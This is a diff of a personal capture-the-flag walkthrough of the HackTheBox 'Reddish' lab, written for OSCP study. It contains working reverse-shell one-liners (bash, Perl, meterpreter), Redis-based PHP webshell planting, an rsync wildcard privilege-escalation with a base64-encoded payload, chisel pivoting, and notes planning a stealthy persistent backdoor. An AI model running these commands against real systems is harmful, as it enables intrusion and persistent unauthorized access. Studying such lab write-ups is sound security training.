@@ -22,10 +22,13 @@ Learnt:
 	1. What is in front of you - what can I use to solve X - not what could be in front of you 
 	2. What sticks out on a blank screen with Favicon and response error code.
 9. The power of `nohup`   and `&` 
+10. WILDCARDS in PrivEsc
+11. Linpeas.sh pivot-delivery 
 Beyond Root:
 - Omni-Tool-Usage for port redirection - but demostrate with Ubuntu server for tools cannot just install onto the box 
 - Clarity over all possible options 
 - Revamp my Port-Redirection article(s), Chisel
+- IDEAS
 
 Returning to this box as I left it in a incomplete state while taking so much information away in 2022. As of 2023 I need a primer on a large potential part of OSCP, virtual and physical networking for AZ. Given this is the forth time returning to this box and the fifth time following along, I must note that I learnt so much and I am here to finish this as helped-through andmake sure port-redirection is engrained in my brain forever. I used and will use again [Ippsec Reddish Video](https://www.youtube.com/watch?v=Yp4oxoQIBAM), [0xDF write up](https://0xdf.gitlab.io/2019/01/26/htb-reddish.html), [0xDF Tunneling and Pivoting](https://0xdf.gitlab.io/2019/01/28/pwk-notes-tunneling-update1.html) and [0xDF using chisel with SSF](https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html)
 As a general note to any unsuspecting readers, this a continuation of trying and so it contains me attempt to figure out were my recon is well tuned and not, but therefore there are also tangents including later additions of trying to figure out by comparison what I not doing correctly or efficiently. In hindsight and the most unhelpful statement to less experienced is that CTF are meant to be solved the pieces exist on the box to solve them, but also rabbit holes that will lead you astray, which is both something you have to learn to live and learn to overcome. There is a very steep learning curve with hacking and CTFs ramp upin a unrealistic way to taeach you a skill of avoiding the rabbit hole, but also the finding the alogorically thread and pull on it, but also collecting all the threads and the "purpose" of the machine. The latter being a SysAdmin it is easy to know that server X does Y function for a business, but when you are doing CTFs it was hard doing these alone without some these obvious to other concepts just apparent. 
@@ -61,7 +64,8 @@ Day 2: returned it generate a new `b1a51218f30da47d4f45b52972804d1a`
 Day 3: After along time away: `695613754dfef3f53a0b18b02d805047`
 Day 4: After some practice elsewhere
 Day 5-7: `c811816e50d58bd34204067b8ba3ae80`
-Day 8: `13492c3c28a60b2a4a00971f3c9a6629`
+Day 8-10: `13492c3c28a60b2a4a00971f3c9a6629`
+Day 11: `7de1d67778f7702daab47daa9ff58d1d`
 
 As of Day 5-8; I have learn so much as to why my approaches were good
 1. Manual combing the with burp site and asking questions is really good
@@ -151,7 +155,7 @@ bash -c 'bash -i >& /dev/tcp/10.10.14.132/8002 0>&1' &
 # Beware it does not auto update fields!
 msfvenom -p linux/x64/meterpreter_reverse_https LHOST=10.10.14.132 LPORT=4444 --platform linux -a x64 -n 200 -e cmd/generic_sh -i 4 -f elf -o rshell
 
-msfconsole -qx "use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter_reverse_https; set LHOST 10.10.14.123; set LPORT 4444; run"
+msfconsole -qx "use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter_reverse_https; set LHOST 10.10.14.94; set LPORT 4444; run"
 
 nc -lvnp  9696 < met
 # On Node RED:
@@ -455,9 +459,9 @@ save
 
 # https://0xdf.gitlab.io/2019/01/26/htb-reddish.html#webshell
 redis-cli -h 127.0.0.1 flushall
-redis-cli -h 127.0.0.1 -x set subscribetoippsec "<? system($_REQUEST['cmd']); ?>"
-redis-cli -h 127.0.0.1 config set dbfilename "cmd.php
-redis-cli -h 127.0.0.1 config set dir /var/www/html
+redis-cli -h 127.0.0.1 -x set subscribetoippsecand0xdf "<? system($_REQUEST['cmd']); ?>"
+redis-cli -h 127.0.0.1 config set dbfilename "cmd.php"
+redis-cli -h 127.0.0.1 config set dir /var/www/html/8924d0549008565c554f8128cd11fda4/
 redis-cli -h 127.0.0.1 save
 exit
 ```
@@ -466,14 +470,17 @@ exit
 curl -X POST http://localhost:10001/cmd.php -d "cmd=perl%20-e%20'use%20Socket;$i=%2210.10.14.123%22;$p=8005;socket(S,PF_INET,SOCK_STREAM,getprotobyname(%22tcp%22));if(connect(S,sockaddr_in($p,inet_aton($i))))%7Bopen(STDIN,%22%3E&S%22);open(STDOUT,%22%3E&S%22);open(STDERR,%22%3E&S%22);exec(%22/bin/bash%20-i%22);%7D;'" --output -
 ```
 
-## Day 10
+The real reason is piecing things together
+![](f187a0ec71ce99642e4f0afbd441a68b.png)
+
+## Day 10-11
 
 But I ran into issues and researched how I was to accomplish this.
 
 Ippsec uses Chisel - Local Pivot
 ```bash
 # Full command for local pivot
-nohup ./chisel client 10.10.14.123:10000 10003:127.0.0.1:10003 &
+nohup ./chisel client 10.10.14.94:10000 10003:127.0.0.1:10003 &
 # Breakdown:
 # Create another 
 chisel client 
@@ -493,35 +500,194 @@ This is so that we catch the reverse shell from the NodeRed and forward back to 
 
 My issue was that I could access it, but it could not access me. To connect up some Azure Vnet knowledge here for revision Peering require connections to be made twice, once in each direction between two vnets.
 
-Fixed the RCE 
+Fixed the RCE -
+- Where are we uploading to? - /8924d0549008565c554f8128cd11fda4/
+- How the CVE described how the need for newlines in the cmd.php webshell
 ```bash
 # 0xDF 
 # cmd.php:
- "<? system($_REQUEST['cmd']); ?>"
+ <? system($_REQUEST['cmd']); ?>
 # 0xdfreddishRCE.sh
 #!/bin/bash
 
 # https://0xdf.gitlab.io/2019/01/26/htb-reddish.html#webshell
 redis-cli -h 127.0.0.1 flushall
-redis-cli -h 127.0.0.1 -x set subscribetoippsecandread0xdf
-redis-cli -h 127.0.0.1 config set dir /var/www/html/
-redis-cli -h 127.0.0.1 config set dbfilename "cmd.php"
+#  -h 127.0.0.1  had this below :/
+cat cmd.php | redis-cli -x set subscribetoippsecandreaddf
+redis-cli -h 127.0.0.1 config set dir /var/www/html/8924d0549008565c554f8128cd11fda4/
+redis-cli -h 127.0.0.1 config set dbfilename "nvm.php"
 redis-cli -h 127.0.0.1 save
 exit
 ```
+Although not something I tried I did check how else it could have been done; [alamot](https://alamot.github.io/reddish_writeup/#getting-www-data-www) prefers *to talk raw Redis. Have a look here [https://www.compose.com/articles/how-to-talk-raw-redis/](https://www.compose.com/articles/how-to-talk-raw-redis/) and here [https://redis.io/topics/protocol](https://redis.io/topics/protocol). So, basically, we can do something like this:
+```bash
+echo -ne '*1\r\n$8\r\nFLUSHALL\r\n*3\r\n$3\r\nSET\r\n$1\r\n1\r\n$32\r\n<?php shell_exec($_GET["e"]); ?>\r\n*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$10\r\ndbfilename\r\n$5\r\nz.php\r\n*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$3\r\ndir\r\n$46\r\n/var/www/html/8924d0549008565c554f8128cd11fda4\r\n*1\r\n$4\r\nSAVE\r\n' | /tmp/socat - TCP:redis:6379
+```
 
+After fixing and figuring and learning so much about myself, chisel and method. BAM:
+![](comeonletsgo.png)
+
+Firstly I wanted to figure out the level of url encoding through curl before trying to ping back
+![](whichperlandurlencoding.png)
+
+```bash
+perl -e 'use Socket;$i="172.19.0.3";$p=10003;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
+
+# We need to url encode the quotes!
+curl http://127.0.0.1:10002/8924d0549008565c554f8128cd11fda4/nvm.php -d 'cmd=perl+-e+%27use+Socket%3b$i%3d%22172.19.0.3%22%3b$p%3d10003%3bsocket(S,PF_INET,SOCK_STREAM,getprotobyname(%22tcp%22))%3bif(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,%22>%26S%22)%3bopen(STDOUT,%22>%26S%22)%3bopen(STDERR,%22>%26S%22)%3bexec(%22/bin/bash+-i%22)%3b}%3b%27' --output -
+
+```
 
 ## Finally a Foothold
 
+![](yes.png)
+
+Once the thrill of getting this far had died down I thren wonder how am I capable of file transfering and get more and better shells - MORE chisels
+
+```bash
+# NodeRED - more chisels
+# 3 is the webshell
+# 4 is to server file transfers through to 
+nohup ./chisel client 10.10.14.94:10000 10004:127.0.0.1:10004 &
+
+nohup ./chisel client 10.10.14.94:10000 10005:127.0.0.1:10005 &
+```
+
+![](wearestillinthedockerception.png)
+
+But with users?
+![](sadhomedir.png)
+
+There is not much in term of files of these users or trace as neither are in /etc/passwd or /etc/groups
+
+![](ipaweareinno4.png)
 
 ## PrivEsc 
 
+Backup directory is the only thing that stands out in the filesystem
+![](backupstandsout.png)
 
-      
+`rsync` is used to backup and I recently was looking into commands I did not know on Linux that other individuals that use linux think are good - [The Linux Cast](https://www.youtube.com/@TheLinuxCast/channels) and [DistroTube](https://www.youtube.com/@DistroTube) for all the Linux things I do not need (till I do) and never knew I needed [This Linux Cast video explained a bit of rsync](https://www.youtube.com/watch?v=-Gl9H8TW774)
+
+[0xdf](https://0xdf.gitlab.io/2019/01/26/htb-reddish.html#webshell) uses a DIY pspy
+```bash
+#!/bin/bash
+
+IFS=$'\n'
+
+old=$(ps -eo command)
+while true; do
+    new=$(ps -eo command)
+    diff <(echo "$old") <(echo "$new") | grep [\<\>]
+    sleep .3
+    old=$new
+done
+```
+
+He then exploit the wildcard of the `rsync -a *.rdb` with a reverse shell `p.rdb` that gets called via create a file `touch` called  `-e sh p.rdb` and using `base64 -d` to add content to `p.rdb`. The [rsync GTFObins](https://gtfobins.github.io/gtfobins/rsync/#shell) `-e sh` is to execute `sh` and because of wildcard - `*.rdb` it will execute because we have made a file that is then interpreted as a command by the rsync cronjob to run our reverse shell `p.rdb`.  
+
+```bash
+# Rsync Root shell
+rlwrap ncat -lvnp 10004
+
+# Add another Chisel - Local Pivot on NodeRed 
+nohup ./chisel client 10.10.14.94:10000 10004:127.0.0.1:10004 &
+
+vim # :set paste [ENTER] i [SHIFT CTRL + V]
+perl -e 'use Socket;$i="172.19.0.3";$p=10004;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
+
+# Encode to base64 to copy
+cat rsync-rs | base64 -w0
+# On Backup Docker container
+
+echo 
+# Copy below type out the above
+cGVybCAtZSAndXNlIFNvY2tldDskaT0iMTcyLjE5LjAuMyI7JHA9MTAwMDQ7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9iYXNoIC1pIik7fTsnCg==
+| base64 -d > /var/www/html/f187a0ec71ce99642e4f0afbd441a68b/p.rdb
+
+# Abuse rsync gtfobins with
+touch /var/www/html/f187a0ec71ce99642e4f0afbd441a68b/-e\ sh\ p.rdb
+```
+
+I decided to follow up to this point and bit further with Ippsec to get this done to move on to finishing my Beyond Roots today! From [Pre 40:00 to 58:00](https://www.youtube.com/watch?v=Yp4oxoQIBAM&t=2342s)
+![](hurrayevenfurtherbeyond.png)
+
+![1080](Reddish-ImprovedThinking)
+
+File transfers for Post-Rsync
+```bash
+
+# Chisel Pivot for File Transfers initially and the a reverse shell - On NodeRed
+nohup ./chisel client 10.10.14.94:10000 10005:127.0.0.1:10005 &
+
+nc -lvnp 10005 < linpeas.sh
+
+bash -c "cat < /dev/tcp/172.19.0.3/10005 > /tmp/linpeas.sh"
+# Aaaaaaaaaaaaaawesome when this worked first
+```
+
+I really want to try get linpeas.sh to tunnel output to 10005, I tried just a text file.
+![](hellofrommanypivotsin.png)
+
+I woops the filename - very Network packet economy Level "Hello did someone order a exfiltration" bad-OPSEC, but very cool 
+![](linpeasdelivery.png)
+
+The question Ippsec says we should be asking about the script is that where is the password? We are stil in the docker container, but as root.
+
+
+
+
 ## Beyond Root
 
 
+####  RSync and Xargs ...its a Long time coming
 
+Priming my brain with some Dual-media - video first and then manual second:
+[Rsync - Jay LaCroix](https://www.youtube.com/watch?v=GqSxR93xK6E), [Rsync Man](https://linux.die.net/man/1/rsync)
+```bash
+df -h # Check the volumes
+lost+found # directory for rsync 
+# Check if it could send data with dry run
+rsync --dry-run $flags $source $destination 
+# -n same as --dry-run
+# -a archive mode
+# -v verbose
+# -z compress
+rsync -avz /source $user@$IP:/destination
+# -4 -6 for prefer IPv4 or IPv6
+# -u skipp newer file on destination!
+# -r recurse into directories
+# -d no recursive
+
+
+# GTFObins - shell, suid and sudo :)
+$sudo rsync -e sh -c "sh $revshell" # suid: "sh -p"
+```
+[gtfobins rsync](https://gtfobins.github.io/gtfobins/rsync/#shell)
+
+[Xargs DistroTube](https://www.youtube.com/watch?v=rp7jLi_kgPg) - take stdin as parametres for commands safely for application that do not by default allow stdin as args. 
+```bash
+# ls, mv, echo - all cant take stdin
+# cmd1 | xargs cmd2
+# 1 - 5 all on one line - both do the same as xargs default to echo
+seq 5 | xargs
+seq 5 | xargs echo 
+# -t get output with cmd and output in two lines
+seq 5 | xargs -t 
+# Specify arguments -I [pattern] like {} below:
+# file.txt contains hostnames: "htb thm ospg" - no space with each hostname on newline   
+cat file.txt | xargs -I {} touch {}.txt 
+# Rename each file a jpg instead
+ls | cut -d. f1 | xargs -I {} mv {}.txt {}.jpg
+# Specify a max number of arguments per line
+ls | xargs -n 3
+# Maximum number a procs at a time
+ls | xargs -n 1 -P 2 bash -c 'echo $0; sleep 1'  
+
+# Find and Xargs and grep all configuration files
+find . -type f -name "*.*onf*" | xargs grep -ie 'passw'
+```
+[Inspiration for the Find,Xargs,grep example](https://phoenixnap.com/kb/xargs-command)
 
 
 #### Omni-Tooling - Port Redirection
@@ -543,19 +709,9 @@ We do not have access to some parts of this box
 
 
 
-
-
 #### Use Node RED to understand Virtual networking 
 
-3.  Build a listening interAnd quick bash script to go back add the video to each as a iframe
-```bash
-
-YOUTUBEVIDID=
-# 
-echo ""
-<iframe width="560" height="315" src="https://www.youtube.com/embed/$YOUTUBEVIDID" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>
-
-```face (likely web) with NodeRed, and use that to tunnel traffic.
+3.  Build a listening interface (likely web) with NodeRed, and use that to tunnel traffic.
 
 https://nodered.org/docs/user-guide/
 
@@ -570,7 +726,7 @@ https://nodered.org/docs/user-guide/
 
 
 - ListenToKali
--  ReplyToKali - incorrect cmd or cmd and proxied response
+- ReplyToKali - incorrect cmd or cmd and proxied response
 
 - Recieve-CMD-ServerLogic - incorrect cmd or attempt cmd
 
@@ -597,7 +753,9 @@ tcp-request - set with msg.host, msg.port
 ```
 
 
-#### And quick bash script to go back add the video to each as a iframe
+#### Add videos to Helped-Through 
+
+And quick bash script to go back add the video to each as a iframe
 ```bash
 
 YOUTUBEVIDID=
@@ -605,4 +763,35 @@ YOUTUBEVIDID=
 echo ""
 <iframe width="560" height="315" src="https://www.youtube.com/embed/$YOUTUBEVIDID" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>
 
+```
+
+
+#### Go HTTPS server + BackdoorShell = Easy Way Back In
+
+Would it not just be nice to have chisel that has a shell or a webserver that has a shell.
+This is very similar to a [[BeyondRoot-Todo]] C2 so I decide
+```go
+
+// Hide in Plain WebApp - redirect to actual Webserver  
+
+// Hide inandthrough  - symlink - rk controlled directory - backup 
+// --custom-backup-loc  
+
+// Persistence scripts to load as modules 
+// default persistence - Linux - chattr etc
+
+// --persistence  
+
+// If Header X (Key) , Agent Y (Almost legitimate Agent string) , Header Z (Cmd:A |Shell:B )  Do -> Open Backdoor and respond with fingerprint for ssl-age 
+// Header U: upload binary to server and execute - putty.exe, etc
+
+// Open Backdoor 
+// process .exe
+// proc gnuintegrity
+```
+
+#### Mad Idea 2 - Flow: One to take control of all network routes from inside a network  
+
+How?
+```
 ```
